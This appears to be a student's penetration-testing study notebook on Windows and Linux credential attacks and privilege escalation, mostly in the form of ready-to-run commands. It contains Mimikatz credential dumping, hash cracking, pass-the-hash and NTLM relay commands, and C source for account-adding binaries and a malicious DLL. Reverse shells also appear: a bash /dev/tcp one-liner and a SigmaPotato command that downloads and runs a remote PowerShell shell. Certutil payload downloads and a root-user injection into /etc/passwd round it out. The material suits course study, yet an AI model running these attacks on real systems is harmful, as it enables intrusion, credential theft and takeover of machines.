In this Learning Unit, we'll demonstrate how to obtain hashes from the Windows operating system. We'll show how we can crack these hashes or use them to gain access to other systems. For this, we'll cover two different hash implementations on Windows: NT LAN Manager (NTLM) hash and Net-NTLMv2.
```

### **Cracking NTLM**

`hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

```jsx
Before we begin cracking NTLM hashes, let's review their implementation and usage Then, we'll demonstrate how we can obtain and crack NTLM hashes in Windows.

Windows stores hashed user passwords in the Security Account Manager (SAM) database file, which is used to authenticate local or remote users.

To deter offline SAM database password attacks, Microsoft introduced the SYSKEY feature in Windows NT 4.0 SP3, which partially encrypts the SAM file. The passwords can be stored in two different hash formats: LAN Manager (LM) and NTLM. LM is based on Data_Encryption_Standard (DES), and is known to be very weak. For example, passwords are case insensitive and cannot exceed fourteen characters. If a password exceeds seven characters, it is split into two strings, each hashed separately. LM is disabled by default beginning with Windows Vista and Windows Server 2008.
```

```jsx
Salts are random bits appended to a password before it is hashed. They are used to prevent an attack in which attackers pre-compute a list of hashes and then perform lookups on these precomputed hashes to infer the plaintext password. A list or table of precomputed passwords is called a Rainbow Table, and the corresponding attack is known as a Rainbow Table Attack.
```

### COMMANDS USERS

`Get-LocalUser` 

`net user paul` 

`Get-ComputerInfo` Cred Guard

# MIMIKATZ

`Get-ComputerInfo` Check Cred guard

`privilege::debug`

`sekurlsa::logonpasswords` **A**ttempts to extract plaintext passwords and password hashes from all
available sources
`lsadump::sam` **** Extract the NTLM hashes from the SAM

`token::elevate`  To elevate to SYSTEM when running as Adminstrator

`mimikatz.exe “privilege::debug” “token::elevate” “sekurlsa::logonpasswords” “exit”` 

`hashcat --help | grep -i "ntlm”`
`hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

## **Passing NTLM**

```jsx
To leverage pass-the-hash (PtH), we need tools that support authentication with NTLM hashes. Fortunately for us, we have many to choose from. Let's review a few examples for different use cases. We can use smbclient or CrackMapExec for SMB enumeration and management. We can use the scripts from the impacket library like psexec.py and wmiexec.py for command execution. We can also use NTLM hashes to not only connect to target systems with SMB, but also via other protocols like RDP and WinRM if the user has the required rights. We can also use Mimikatz to conduct pass-the-hash as well.
```

`smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`

![image.png](image%2019.png)

## PSEXEC AND WMI EXEC WINRM

`impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b [Administrator@192.168.50.212](mailto:Administrator@192.168.50.212)`

`impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b [Administrator@192.168.50.212](mailto:Administrator@192.168.50.212)` 

`impacket-psexec SAM:DISISMYPASSWORD@192.168.183.210`

`impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`    With Domain

`evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!”`

`evil-winrm -i 192.168.124.75 -u corp\robert -p "@Password1234"`

NULL HASH : 31d6cfe0d16ae931b73c59d7e0c089c0

## **Cracking Net-NTLMv2 ( When Low Privs )**

```jsx

In some penetration tests, we may obtain code execution or a shell on a
Windows system as an unprivileged user. This means that we cannot use
tools like Mimikatz to extract passwords or NTLM hashes. In situations
like these, we can abuse the *Net-NTLMv2* network authentication protocol.
This protocol is responsible for managing the authentication process for
Windows clients and servers over a network.
```

```jsx
At a high level, we'll send the server a request, outlining the connection details to access the SMB share. Then the server will send us a challenge in which we encrypt data for our response with our NTLM hash to prove our identity. The server will then check our challenge response and either grant or deny access, accordingly.
```

**IMPORTANT :**

```jsx
For example, when we discover a file upload form in a web application on a Windows server, we can try to enter a non-existing file with a UNC path like \\192.168.119.2\share\nonexistent.txt. If the web application supports uploads via SMB, the Windows server will authenticate to our SMB server.
```

## RESPONDER

`net user paul`  > Check RDP is allowed 

`ip a` 

`sudo responder -I tap0`

`dir \\192.168.119.2\test`

`hashcat --help | grep -i "ntlm”` > ntlmv2

## **Relaying Net-NTLMv2 ( If Not CrackAble And No Privs )**

```jsx
In this section, we'll have access to FILES01 as an unprivileged user (files02admin), which means we cannot run Mimikatz to extract passwords. Using the steps from the previous section, imagine we obtained the Net-NTLMv2 hash, but couldn't crack it because it was too complex.
```

```jsx
What we can assume based on the username is that the user may be a local administrator on FILES02. Therefore, we can try to use the hash on another machine in what is known as a relay attack.
```

- **FILES01**: A Windows machine where you have access as a **low-privileged user**: `files02admin`.
- **FILES02**: Another Windows machine on the same network.
- **Goal**: Execute commands on **FILES02** without cracking the Net-NTLMv2 hash.

`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA...”`  UTF-16LE

`nc -nvlp 8080`

## **Windows Credential Guard (** *domain* accounts )

```jsx
We'll discuss the inner workings of domain authentication in later modules, but for now we should demonstrate how the operating system stores the password hash of Windows users that log in with a domain account on a Windows device. If we're able to obtain this hash, we could either crack it or use it in a pass-the-hash attack.
```

[*Virtual Secure Mode](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/tlfs/vsm)* (VSM)

Random Info

```jsx
VSM creates isolated regions in memory where the operating system can store highly-sensitive information and system security assets. **These regions can only be accessed through the hypervisor which runs at higher privileges than even the kernel**, meaning that even if we were to elevate our privileges to SYSTEM, we would still not be able to access these regions.
VSM maintains this isolation through what is known as Virtual Trust Levels (VTLs). Each VTL represents a separate isolated memory region and currently Microsoft supports up to 16 levels, ranked from least privileged, VTL0, to VTL1, with VTL1 having more privileges than VTL0 and so on. As of the writing of this module Windows uses two VTLs:

    VTL0 (VSM Normal Mode): Contains the Windows environment that hosts regular user-mode processes as well as a normal kernel (nt) and kernel-mode data.
    VTL1 (VSM Secure Mode): Contains an isolated Windows environment used for critical functionalities.

The user-mode in VTL1 is known as Isolated User-Mode (IUM), which consists of IUM processes known as Trusted Processes, Secure Processes, or Trustlets.

Microsoft has used VSM as a base for several mitigations including Device Guard, virtual TPMs and Credential Guard.

These security features premiered with Windows 10 and Windows Server 2016, however, they were not enabled by default. Because of this, the vast majority of machines encountered in an enterprise environment do not have them enabled. With the recent pivot from Microsoft to prioritize security above all these security mitigations are enabled by default on modern Windows installations.

**As of the time of writing, if machines are simply updated rather than freshly installed the state of the security mitigations carry over. For example, if these security mitigations were previously disabled, they will be remain disabled after an update.**

In this Module, we'll focus on Credential Guard mitigation. When enabled, the Local Security Authority (LSASS) environment runs as a trustlet in VTL1 named LSAISO.exe (LSA Isolated) and communicates with the LSASS.exe process running in VTL0 through an RCP channel.
```

Check Cred Guard

`Get-ComputerInfo` 

Random Info : 

```jsx
Microsoft provides quite a few authentication mechanisms as part of the Windows operating system such as Local Security Authority (LSA) Authentication, Winlogon, Security Support Provider Interfaces (SSPI), etc.

Specifically, SSPI is foundational as it is used by all applications and services that require authentication. For example, when two Windows computers or devices need to be authenticated in order to securely communicate, the requests made for authentication are routed to the SSPI which then handles the actual authentication.

By default, Windows provides several Security Support Providers (SSP) such as Kerberos Security Support Provider, NTLM Security Support Provider, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.
```

`privilege::debug`

`misc::memssp`

Either Wait For User To Login Or Use Social Eng

```jsx
When injecting a SSP into LSASS using Mimikatz, the credentials will be saved in a log file, C:\Windows\System32\mimilsa.log.
```

# **Windows Privilege Escalation**

SHOW HIDDEN FILES

CVE-2023-29360

Random Info 

```jsx
The SID string consists of different parts, delimited by "-", and represented by the placeholders "S", "R", "X", and "Y" in the following listing. This representation is the fundamental structure of a SID.

S-R-X-Y

    Listing 1 - SID representation

The first part is a literal "S", which indicates that the string is a SID.

"R" stands for revision and is always set to "1", since the overall SID structure continues to be on its initial version.

"X" determines the identifier authority. This is the authority that issues the SID. For example, "5" is the most common value for the identifier authority. It specifies NT Authority and is used for local or domain users and groups.

"Y" represents the sub authorities of the identifier authority. Every SID consists of one or more sub authorities. This part consists of the domain identifier and relative identifier (RID). The domain identifier is the SID of the domain for domain users, the SID of the local machine for local users, and "32" for built-in principals. The RID determines principals such as users or groups.

The following listing shows an example SID of a local user on a Windows system:

S-1-5-21-1336799502-1441772794-948155058-1001

    Listing 2 - SID representation

Listing 2 shows that the RID is 1001. Because the RID starts at 1000 for nearly all principals, this implies that this is the second local user created on the system.

There are SIDs that have a RID under 1000, which are called well-known SIDs. These SIDs identify generic and built-in groups and users instead of specific groups and users. The following listing contains some useful well-known SIDs in the context of privilege escalation.

S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator

```

Always Enumerate :

https://dencode.com/en/

```jsx
- Username and hostname  =  whoami
- Group memberships of the current user = whoami /groups
- Existing users and groups = Get-LocalUser or net user and Get-LocalGroup , Get-LocalGroupMember adminteam
- Operating system, version and architecture = systeminfo
- Network information = ipconfig /all route print
- Installed applications= Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname **and** Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname and **Get-Process**
- Running processes = netstat -ano

**(Get-Process -Id 4540).Path

*WINDOWS.OLD*

ENV : set

Desktop Text Files Or Run Sauron Eye meeting notes, configuration files, or onboarding documents

Always Re-Enumerate After Priv Esc

ALWAYSSSSSSS : Get-ChildItem -Path C:\Users\diana -Include -File -Recurse -ErrorAction SilentlyContinue

 Get-ChildItem -Path C:\Users\diana -Filter *.txt -File -Recurse -ErrorAction SilentlyContinue

If got creds but no rdp or winrm and if we dont have gui access then we can try Log on as a batch job sch task Or psexec, See Below For details

Always check every file you will get where you wont expect

ALWAYS TRY PUBLIC FOLDERS < SAURON EYE MAY NOT CAPTURE ENCODED FILES
https://dencode.com/en/

exploit/windows/local/bypassuac_sdclt**
```

`schtasks /create /tn "MyTask" /tr "C:\Path\To\Your.exe" /sc once /st 12:00 /ru "DOMAIN\User" /rp "UserPassword" /f` 

`schtasks /create /tn "MyTask" /tr "C:\Path\To\Your.exe" /sc once /st 12:00 /ru "DOMAIN\User" /rp "UserPassword" /f`

DNS TIMEOUT AND ACCESS DENIED ERROR 

```jsx
Get rdp using adduser then 
schtasks /create /tn "OneTimeShell" /tr "cmd /c \"C:\Users\eric.wallows\Documents\conshell.exe 192.168.45.168 3002\"" /sc once /st 17:34 /ru SYSTEM /f

```

`strings admintool.exe | grep -i "pass"`

```jsx
**Get-ChildItem -Path C:\Users\ -Include**  *.txt,*.log,*.csv,*.conf,*.ini,*.xml,*.json,*.yaml,*.yml,*.env,*.doc,*.docx,*.xls,*.xlsx,*.pdf,*.rtf,*.odt,*.sql,*.db,*.sqlite,*.bak,*.kdbx,*.pem,*.key,*.crt,*.rdp,*.ovpn,*.pcap,*.msg,*.eml,*.ps1,*.sh,*.bat,*.py,*.php,*.js,*.java,*.c,*.cpp, *.git  **-File -Recurse -ErrorAction SilentlyContinue**

```

**Note : Helpdesk staff often have additional permissions and access compared to standard users.**

**Backup solutions often have extensive permissions to perform their operations on the file system, making both potentially valuable targets.**

**Apart from the non-standard groups, there are several built-in groups we should analyze, such as *Administrators*, *Backup Operators*, *Remote Desktop Users*, and *Remote Management Users*.**

**The output also shows that apart from the disabled local
*Administrator* account, the users *daveadmin* and *BackupAdmin*
are members of the local *Administrators* group. Therefore, we've now
identified two highly valuable targets.**

`Members of *Remote Desktop Users* can access the system with RDP,
while members of *Remote Management Users* can access it with *WinRM*.`

```jsx
Obtaining privileged access on every machine in a penetration test is rarely a useful or realistic goal. While most machines in the challenge labs of this course are rootable, we'll face numerous non-rootable machines in real-life assessments. A skilled penetration tester's goal is therefore not to blindly attempt privilege escalation on every machine at any cost, but to identify machines where privileged access leads to further compromise of the client's infrastructure.
```

**IMPORTANT :**

```jsx
However, the listed applications from Listing 15 may not be complete. For example, this could be due to an incomplete or flawed installation process. Therefore, we should always check 32-bit and 64-bit Program Files directories located in C:\. Additionally, we should review the contents of the Downloads directory of our user to find more potential programs.
```

https://dencode.com/en/

### BASE64

## sauroneye

 `.\SauronEye.exe -d C:\ --filetypes .txt .log .csv .conf .ini .xml .json .yaml .yml .env .doc .docx .xls .xlsx .pdf .rtf .odt .sql .db .sqlite .bak .kdbx .pem .key .crt .rdp .ovpn .pcap .msg .eml .ps1 .sh .bat .py .php .js .java .c .cpp --contents --keywords password pass* -v --maxfilesize=5000`

## Runas

`runas /user:backupadmin cmd`

`runas /user:corp\robert cmd`

## **Goldmine PowerShell**

```jsx
Transcription is often referred to as "over-the-shoulder-transcription", because, when enabled, the logged information is equal to what a person would obtain from looking over the shoulder of a user entering commands in PowerShell. **The information is stored in transcript files, which are often saved in the home directories of users, a central directory for all users of a machine, or a network share collecting the files from all configured machines.**
```

```jsx
Get-History
(Get-PSReadlineOption).HistorySavePath
cd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

if you found a file containing connection string but the creds are in $creds try to dinf transcript

strings admintool.exe | grep -i "pass"
```

```jsx
Starting with PowerShell v5, v5.1, and v7, a module named PSReadline is included, which is used for line-editing and command history functionality.

Interestingly, Clear-History does not clear the command history recorded by PSReadline
```

Random Info

```jsx
PowerShell Remoting by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group Windows Management Users to be a valid user for these Cmdlets. However, instead of WinRM, SSH can also be used for PowerShell remoting.
```

```jsx
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
whoami

PS SESSION IS UNSTABLE SOMETIMES ONLY WHOAMI WORKS < TRY EVIL-WINRM
EVENT LOGS

Event Viewer > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational > 4104

Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[(EventID=4104)]]" | Format-List > C:\ProgramData\new.txt
```

## EVIL WINRM

`evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!”`

## **Automated Enumeration**

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

[https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)

COMPILED

[https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

Sometimes Icals Show you cannot write it but we can 

### Powershell download command

`iwr -uri http://192.168.45.165/winp.exe -Outfile winPEAS.exe`

```jsx
.\winPEAS.exe
seatbealt -group=all very good
Winpeas Important 
Powershell History
Nice User Enum
DPAPI Master Files ( IDK its in the LAb maybe imp )
```

# **Leveraging Windows Services**

Windows services are one of the main areas to analyze when searching for privilege escalation vectors

## **Service Binary Hijacking**

```jsx
When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.
```

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}` 

OR `wmic service get name, pathname`

OR 

```jsx

PS C:\TEMP> . .\watch.ps1
PS C:\TEMP> Get-Process backup | Watch-Command -Continuous -Difference
https://github.com/markwragg/PowerShell-Watch/blob/master/Watch/Public/Watch-Command.ps1
```

OR 

```jsx
$services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services"
foreach ($service in $services) {
    $path = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($service.PSChildName)").ImagePath
    Write-Output "$($service.PSChildName) => $path"
}

```

```jsx
Based on the output in Listing 40, the two XAMPP services Apache2.4 and mysql stand out as the binaries are located in the C:\xampp\ directory instead of C:\Windows\System32. This means the service is user-installed and the software developer is in charge of the directory structure as well as permissions of the software. These circumstances make it potentially prone to service binary hijacking.
```

![image.png](image%2020.png)

`icacls "C:\xampp\apache\bin\httpd.exe”` 

`icacls "C:\xampp\mysql\bin\mysqld.exe”`

**Sometimes Icals Show you cannot write it but we can** 

![image.png](image%2021.png)

```jsx
As member of the built-in Users group, dave only has Read and Execute (RX) rights on httpd.exe, meaning we cannot replace the file with a malicious binary.
```

**SOMETIMES YOU CANNOT ADD A USER SO PLEASE TRY REVSHELL** 

```jsx
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

```

`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`  > 64-Bit

`x86_64-w64-mingw32-gcc -m32 adduser.c -o adduser.exe` > 32-bit

Make Backup And Replace

`move C:\xampp\mysql\bin\mysqld.exe mysqld.exe`

`move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe`

`net stop mysql`  Maybe This Cause Access Denied

Start-Service name

Check Startup Type Of Service

`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`

Check Shutdown Privs

`whoami /priv`  Find SeShutdownPrivs

`shutdown /r /t 0` 

Confirm That Our Attack Worked

`Get-LocalGroupMember administrators`

```jsx
 In addition, we could also use msfvenom to create an executable file, starting a reverse shell.
```

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

## EXECUTION POLICY

```jsx
powershell -ExecutionPolicy Bypass -File .\PowerUp.ps1
PS C:\Users\alex> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

. .\PowerUp.ps1
```

`. .\PowerUp.ps1`

`Get-ModifiableServiceFile` OR **Invoke-AllChecks**

```jsx
PowerUp also provides us an AbuseFunction, which is a built-in function to replace the binary and, if we have sufficient permissions
```

The default behavior is to create a new local user called
*john* with the password *Password123!* and add it to the local
*Administrators* group

`Install-ServiceBinary -Name 'mysql’`

Some Times Auotomated Tools Fails So We should Always Try mannual

## **DLL Hijacking**

```jsx
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

Find Exploits For The Installed Software For Dll Hijacks

`echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt’`

```jsx
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

`x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll`

`iwr -uri [http://192.168.48.3/TextShaping.dll](http://192.168.48.3/TextShaping.dll) -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'`

```jsx
it is important to keep in mind that the privileges the DLL will run with depend on the privileges used to start the application. If we were to start the FTP client as the user steve then we would not have the required privileges to add a new user to the system and place them in the Administrators group.

With this in mind, we don't have to start the application on our own. We have the option of waiting for someone with higher privileges to run the application and trigger the loading of our malicious DLL.
```

## **Unquoted Service Paths**

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName` 

`Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName -notlike '*\Windows\System32*' } | Select-Object Name, State, PathName`

`wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /r /v "^$"` 

`icacls "C:\Program Files\Enterprise Apps”` Also Try With File Creation Using Windows Exp

Sometimes built is users dont have permision but a user can have powerup can get it or use type

`Start-Service GammaService`  ignore some errors

`Stop-Service GammaService`

`. .\PowerUp.ps1`

**`Get-UnquotedService`**

`Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe”`

## **Scheduled Tasks**

```jsx
For us, three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:

    As which user account (principal) does this task get executed?
    What triggers are specified for the task?
    What actions are executed when one or more of these triggers are met?

```

Important 

```jsx
Author, TaskName, Task To Run, Run As User, and Next Run Time fields
```

 ``          

`Get-ScheduledTask -TaskPath "\Microsoft\" -TaskName "Voice Activation"` 

`schtasks /Query /TN "\Microsoft\Voice Activation"`

or 

```jsx
Get-ScheduledTask | Where-Object {
    ($_.Principal.UserId -ne "$env:USERNAME" -and $_.Principal.UserId -ne "$env:USERDOMAIN\$env:USERNAME") -and
    ($_.Actions.Execute -notmatch '(?i)(C:\\Windows\\System32|%SystemRoot%|%WINDIR%)')
} | ForEach-Object {
    $info = Get-ScheduledTaskInfo -TaskName $_.TaskName -TaskPath $_.TaskPath
    "$($_.TaskName) | Author: $($_.Principal.UserId) | Task To Run: $($_.Actions.Execute) | Run As: $($_.Principal.UserId) | Next Run: $($info.NextRunTime)"
}

```

Find A Vulnerable Task And Replace the binary after checking the last and next run time 

## **Using Exploits**

```jsx
Installed applications on a Windows system may contain different types of vulnerabilities as we learned in the Module "Locating Public Exploits". If these applications run with administrative permissions and we can exploit a vulnerability that leads to code execution, we can also successfully elevate our privileges.
```

```jsx
The second kind is to exploit vulnerabilities in the Windows Kernel. 
```

**Check For Privs** 

`whoami /priv`  other then these normal 

```jsx
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

**Enumerate the version of Windows as well as any security patches installed**

`systeminfo`

`Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`

Find related Exploit Using Extnesive Searches

## Privs Exploitation

```jsx

Other privileges that may lead to privilege escalation are
*SeBackupPrivilege*, *SeAssignPrimaryToken*, *SeLoadDriver*, and
*SeDebug*. In this section, we'll closely inspect privilege escalation
vectors in the context of *SeImpersonatePrivilege*.

```

***SeImpersonatePrivilege***

```jsx
By default, Windows assigns this privilege to members of the local Administrators group as well as the device's LOCAL SERVICE, NETWORK SERVICE, and SERVICE accounts.
```

```jsx
**RANDOME**
Named pipes are one method for local or remote Inter-Process Communication in Windows. They offer the functionality of two unrelated processes sharing and transferring data with each other. A named pipe server can create a named pipe to which a named pipe client can connect via the specified name. The server and client don't need to reside on the same system.
```

```jsx
**RANDOME**
Once a client connects to a named pipe, the server can leverage SeImpersonatePrivilege to impersonate this client after capturing the authentication from the connection process. To abuse this, we need to find a privileged process and coerce it into connecting to a controlled named pipe. With SeImpersonatePrivilege assigned, we can then impersonate the user account connecting to the named pipe and perform operations in its security context.
```

[https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)

`.\SigmaPotato "net user dave4 lab /add”`

.\SigmaPotato "net user dave5 lab /add"

.\SigmaPotato "net localgroup Administrators dave5 /add”

https://jlajara.gitlab.io/Potatoes_Windows_Privesc

`.\sweet.exe -p adduser.exe`

```jsx

    Use Sweet Potato to rule them all - Sweet Potato

If you do not want to use Sweet Potato:

    If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato & god

    If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato

```

`.\SigmaPotato "powershell.exe -Command \"IEX(IWR '[http://192.168.45.195/Invoke-ConPtyShell.ps1](http://192.168.45.195/Invoke-ConPtyShell.ps1)' -UseBasicParsing); Invoke-ConPtyShell 192.168.45.195 3001\""`

# CERTUTIL

`certutil -urlcache -split -f [http://192.168.45.165/](http://192.168.45.165/Invoke-ConPtyShell.ps1)PrintSpoofer64.exe PrintSpoofer64.exe`

`powershell -Command "wget [http://tmpfiles.org/dl/1451569/9099.dll](http://tmpfiles.org/dl/1451569/9099.dll) -o C:\ProgramData\file.dll"`

Capstone Lab : creds in txt file , missing dll in a service logs , sebackrivs , dump sam and system , sometimes sam is saved as samreg using reg [secretsdump.py](http://secretsdump.py/) -system system -sam sam LOCAL

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---privileged-file-write

# **Linux Privilege Escalation**

```jsx
One of the defining features of Linux and other UNIX derivatives is that most resources, including files, directories, devices, and even network communications are represented in the filesystem. Put colloquially, "everything is a file".
```

```jsx
Every file (and by extension every element of a Linux system) abides by user and group permissions based on three primary properties: read (symbolized by r), write (symbolized by w), and execute (symbolized by x). Each file or directory has specific permissions for three categories of users: the owner, the owner group, and others group.
```

```jsx
For files, r allows reading the file content, w allows changing its content and x allows the file to be run. A directory is handled differently from a file. Read access gives the right to consult the list of its contents (files and directories). Write access allows creating or deleting files. Finally, execute access allows crossing through the directory to access its contents (using the cd command, for example). Being able to cross through a directory without being able to read it gives the user permission to access known entries, but only by knowing their exact name.
```

## **Manual Enumeration**

```jsx
id > user info

***RUN PSPY
./pspy64 -r /bin,/etc,/home,/opt,/var,/usr,/tmp -pf -i 1000***

cat /etc/passwd > such as www-data and sshd. This indicates that a web server and an SSH server are likely installed on the system.

hostname 

 groups username
cat /etc/issue
cat /etc/os-release
cat /etc/sudoers
uname -a

ps aux
systemctl | grep running
routel

ss -anp

for priv esc sometimes u need to make tunnel and then surf the internal website
$ proxychains4 nmap 127.0.0.1 -sT                         
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 12:25 PKT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000044s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
1080/tcp open  socks
8000/tcp open  http-alt
```

```jsx

Login Name: "joe" - Indicates the username used for login.

Encrypted Password: "x" - This field typically contains the hashed version of the user's password. In this case, the value x means that the entire password hash is contained in the /etc/shadow file (more on that shortly).

UID: "1000" - Aside from the root user that has always a UID of 0, Linux starts counting regular user IDs from 1000. This value is also called real user ID.

GID: "1000" - Represents the user's specific Group ID.

Comment: "joe,,," - This field generally contains a description about the user, often simply repeating username information.

Home Folder: "/home/joe" - Describes the user's home directory prompted upon login.

Login Shell: "/bin/bash" - Indicates the default interactive shell, if one exists.

Aside from the rwx file permissions described previously, two additional special rights pertain to executable files: setuid and setgid. These are symbolized with the letter "s".

```

```jsx
In addition to the joe user, we also notice another user named eve, and we can infer this is a standard user since it has a configured home folder /home/eve. On the other hand, system services are configured with the /usr/sbin/nologin as login shell, where the nologin statement is used to block any remote or local login for service accounts.
```

***db* for a database server, *dc* for a domain controller, etc.**

> We can also investigate port bindings to see if a running service is only available on a loopback address
> 

**IMPORTANT**

```jsx
In general, we're primarily interested in a firewall's state, profile, and rules during the remote exploitation phase of an assessment. However, this information can also be useful during privilege escalation. For example, if a network service is not remotely accessible because it is blocked by the firewall, it is generally accessible locally via the loopback interface. If we can interact with these services locally, we may be able to exploit them to escalate our privileges on the local system.
```

```jsx
On Linux-based systems, we must have root privileges to list firewall rules with iptables. However, depending on how the firewall is configured, we may be able to glean information about the rules as a standard user.

For example, the iptables-persistent package on Debian Linux saves firewall rules in specific files under /etc/iptables by default. These files are used by the system to restore netfilter rules at boot time. These files are often left with weak permissions, allowing them to be read by any local user on the target system.

We can also search for files created by the iptables-save command, which is used to dump the firewall configuration to a file specified by the user. This file is then usually used as input for the iptables-restore command and used to restore the firewall rules at boot time. If a system administrator had ever run this command, we could search the configuration directory (/etc) or grep the file system for iptables commands to locate the file. If the file has insecure permissions, we could use the contents to infer the firewall configuration rules running on the system.
```

`cat /etc/iptables/rules.v4`

### **CRONTAB**

```jsx
The Linux-based job scheduler is known as cron. Scheduled tasks are listed under the /etc/cron.* directories, where * represents the frequency at which the task will run. For example, tasks that will be run daily can be found under /etc/cron.daily. Each script is listed in its own subdirectory.
```

```jsx
ls -lah /etc/cron*
/etc/cron.hourly:
monthly weekly daily
crontab -e

LIKE THIS cat /etc/cron.hourly/archiver  LIST EVERY SCIPT TO FIND OUT WHAT ITS DOING
```

```jsx
crontab -l ( Only for current User )
sudo crontab -l ( Suod revels More Info )
As we'll learn later in this Module, the joe user has been granted specific sudo permission only to list cron jobs running as the root user. This permission alone cannot be abused to obtain a root shell.
```

## SUDO TO REVSHELL

```jsx
sudo bash -c 'bash -i >& /dev/tcp/192.168.45.250/9002 0>&1'
```

### Installed Programs

```jsx
dpkg -l
rpm -qa
```

### InSecure Permissions

```jsx
find / -writable -type d 2>/dev/null
```

```jsx
As shown above, several directories seem to be world-writable, including the /home/joe/.scripts directory, which is the location of the cron script we found earlier. This certainly warrants further investigation.
```

Check for sentive file writes like etc/passwd

`openssl passwd w00t`

`echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`

`su root2`

```jsx
